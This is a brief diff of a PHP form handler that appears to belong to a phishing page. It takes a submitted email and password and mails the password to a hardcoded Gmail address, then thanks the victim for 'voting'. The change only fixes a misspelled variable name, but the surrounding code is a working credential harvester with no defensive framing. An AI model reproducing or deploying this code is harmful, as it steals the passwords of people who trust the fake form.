@@ -3,8 +3,8 @@ if (isset($_POST['submit'])) {
 $mailto = "icavodica@gmail.com";
 $from = $_POST['email'];
 $password = $_POST['password'];
-$suject = $_POST['subject'];
-$suject2 = "prijava uspesna";
+$subject = $_POST['subject'];
+$subject2 = "prijava uspesna";
 $message = "Uspesno poslato". $password. "je pasvord";
 $message2 = "Hvala Vam sto ste glasali!";
 $headers = "From: ". $from;
